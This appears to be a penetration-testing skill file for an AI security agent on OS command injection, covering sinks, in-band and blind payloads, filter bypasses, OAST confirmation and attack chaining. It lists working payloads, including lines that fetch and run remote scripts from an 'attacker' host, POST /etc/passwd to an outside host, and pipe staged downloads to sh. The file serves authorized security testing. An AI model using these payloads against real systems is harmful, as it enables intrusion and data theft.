---
name: command_injection
description: OS command injection testing covering in-band and blind detection, shell- and OS-specific payloads, filter bypass, and OAST confirmation
---

# Command Injection

Command injection lets an attacker execute operating-system commands through an application that passes user input into a shell or process-execution primitive. It is the highest-impact member of the injection family: one injection point is usually straight to RCE. The bug lives wherever user input reaches `system()`, `exec()`, `popen()`, subprocess/`ProcessBuilder`/`Runtime.exec`, backticks, `cmd /c`, or a shell built via string concatenation.

## Attack Surface

**Sinks by language**

- PHP: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, backticks
- Python: `os.system`, `os.popen`, `subprocess` with `shell=True`, `eval`/`exec` of shell strings
- Node.js: `child_process.exec`, `execSync`, `spawn` with `shell: true`
- Java: `Runtime.getRuntime().exec` (no shell by default, but often wrapped), `ProcessBuilder` that gets shelled downstream
- .NET: `Process.Start`, `cmd /c` wrappers
- Ruby: `system`, backticks, `%x()`, `IO.popen`, `Open3`
- Go: `exec.Command` with `sh -c` or `cmd /c`

**Feature surfaces**

- Ping / traceroute / DNS lookup / WHOIS / nslookup / dig panels
- Downloaders, converters (ffmpeg, ImageMagick, wkhtmltopdf), archive extractors (tar, zip, 7z, unrar)
- Backup/export/import jobs, report generators, mailers
- Git/package operations triggered by user input (clone URL, package name)
- File operations that flow into shell commands (filename, path, extension)
- Language/tool fields in code runners or search features wired to grep/find
- API parameters that reach CLI wrappers or Docker exec

**Indirect sinks** - log poisoning (User-Agent/Referer into access.log later executed via LFI), mail logs, cron, and any user-controlled value that lands in a shell string later.

## Reconnaissance

1. **Map every input that reaches a process**: parameters, headers, filenames, upload names, URLs. Source-aware: grep for the sink list above and trace user data to them.
2. **Establish the shell context**: Linux `/bin/sh` vs Windows `cmd.exe`/PowerShell changes payload syntax entirely. Fingerprint via `Server`, error pages, or platform-specific behavior.
3. **Choose the oracle**: in-band (output echo) if the app reflects command output, blind (timing or OAST) otherwise.

## Key Vulnerabilities

### In-Band (Output Reflected)

Terminate the original command and append a probe that prints a unique marker:

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id          (newline)
%0d%0a id       (CRLF)
```

Use unique markers to avoid false positives from genuine command output:

```
; echo STRIX_<random>
```

### Blind (No Output)

**Timing** (works even with no egress):

```
; sleep 5
| ping -c 5 127.0.0.1
& timeout /t 5
; ping -n 5 127.0.0.1
```

Run the same request without the payload and diff response times; use 5-10 second sleeps and repeat 2-3 times per point to beat network jitter.

**OAST** (strongest evidence; see `tooling/interactsh`):

```
; curl http://<unique>.oast.fun/x
| nslookup <unique>.oast.fun
; wget http://<unique>.oast.fun
```

Windows PowerShell: `; Invoke-WebRequest http://<unique>.oast.fun/x`

## Payloads by Context

### Linux / POSIX

- No-space bypasses: `${IFS}`, tab (`%09`), `$IFS$IFS`, `${IFS}whoami`, `$@` / `$*` (empty, used as separators), brace expansion `{cat,/etc/passwd}`, `$'\x20'`
- Character construction when letters are filtered: `$(printf 'id')`, `$'\x69\x64'`, `c""at`, `c'a't`, `ca\t`
- Read files without cat: `$(< /etc/passwd)`, `tail -n +1 /etc/passwd`, `head /etc/passwd`
- Encode payloads: `echo <b64> | base64 -d | sh`; PowerShell: `[Convert]::FromBase64String(...)`

### Windows cmd.exe

```
& whoami
| whoami
&& whoami
%PATH:~0,1%     (build characters from env vars)
for /f %i in ('whoami') do @echo %i
```

### Windows PowerShell

```
; whoami
; $(whoami)
; iex (iwr http://attacker/payload.ps1)
```

### Framework/parser quirks

- Some parsers strip semicolons but pass pipes: test each metacharacter (`; | & && || $() backtick newline`) individually and binary-search the filter
- Double/triple URL encoding (`%250a`) beats single-decode WAFs
- Newline-only payloads (`%0a`) bypass line-based signatures while staying valid in many shells
- JSON/XML bodies: `\n` inside strings may reach the shell as a real newline

## Bypass Techniques

**Spaces blocked**

- `${IFS}`, tab, `$IFS`, `$@`, `$*`, `${PS2}`, brace expansion

**Blacklist of command names**

- Insert quotes/escapes: `c""at`, `c'a't`, `ca\t`, `who$@ami`, `w\hoami`
- Env-var splitting: `$PWD` contains `/`; construct names with `${PATH:0:1}`
- `printf`/`base64` decoding, then execute
- Use alternatives: `awk`, `perl`, `php -r`, `python3 -c`, `bash -c`

**No output channel**

- Write results to a web-accessible file, or exfiltrate via OAST DNS/HTTP
- `curl -X POST -d @/etc/passwd http://attacker/` (best-effort; OAST preferred)

**Length limits**

- Fetch a staged payload: `curl <host>/p|sh`; base64 payloads; `wget <host>/x -O /tmp/x`
- Reuse env vars already set (`$IFS`, `$PATH`, `$HOME`) when the character budget is tiny

## Chaining Attacks

- Command injection -> reverse shell (authorized targets only; prefer non-destructive proof like OAST or a marker file)
- Log poisoning + LFI -> command execution through access.log/auth.log/mail.log when direct sinks are filtered
- SSRF + command injection -> reach internal tooling that executes commands (CI, admin panels)
- Image/PDF conversion bugs (ImageMagick MVG, ffmpeg) that execute external programs
- Cron/at injection when the app writes user input into crontabs

## Testing Methodology

1. **Identify sinks** - source-aware grep for the sink list, or black-box map of features that plausibly shell out
2. **Pick oracles** - in-band marker, timing, or OAST (prefer OAST for blind cases)
3. **Baseline** - record normal response and latency for each point
4. **Test separators** - `;`, `|`, `||`, `&&`, `$()`, backticks, newline
5. **Test blind** - sleep/ping for timing, `curl`/`nslookup` to interactsh for OAST
6. **Bypass filters** - spaces, metacharacter blacklists, command-name blacklists, length limits
7. **Escalate** - read a sensitive file, write a marker, or chain to a durable primitive

## Validation

1. Reproduce with the exact request/response pair; the injected command must observably run (marker in output, OAST hit, or consistent time delta)
2. Prove the command executes under the target's account (OS/user evidence) rather than echoing a canned value
3. Prefer low-impact proof (marker file, OAST hit, `id`/`whoami` output) over destructive payloads
4. Document which metacharacters/context the application allows and the exact filter bypass

## False Positives

- Output that appears to echo the payload but never executes (reflection, not injection)
- WAF blocks the payload before the app (403/429 with no app processing) - not a finding
- Timing differences from network jitter or app-level sleep/retry logic - repeat and use longer sleeps
- OAST hit whose source IP is your own machine (client-side fetch, not the server)
- App errors mention the command but the command did not run (shell unavailable, restricted shell)

## Impact

- Full remote code execution as the application user
- Lateral movement and privilege escalation from a compromised app account
- Data theft (source, credentials, databases) and ransomware-style impact

## Pro Tips

1. Always use unique markers (`STRIX_<random>`) so reflected-output matches are provable
2. Prefer OAST confirmation for blind cases; pair it with timing to prove the code path executes
3. Test one metacharacter at a time when filters exist; binary-search what passes
4. Remember Windows: cmd.exe separators differ from PowerShell; test both when the stack is ambiguous
5. Check how the app invokes the command (array vs string, `shell=True`, `cmd /c`) - it determines whether a payload is reachable
6. When sinks are sandboxed (Docker exec, nsjail), prove impact inside the sandbox and note the boundary
7. Chain immediately to impact: reading a secrets file or dropping a marker is worth more than a bare `id`

## Summary

Any user-controlled value that reaches a shell or process spawn is a potential RCE. Detect with in-band markers, timing, or OAST; bypass filters by varying separators, whitespace, quoting, and encoding; then prove execution and chain to the most useful impact available.
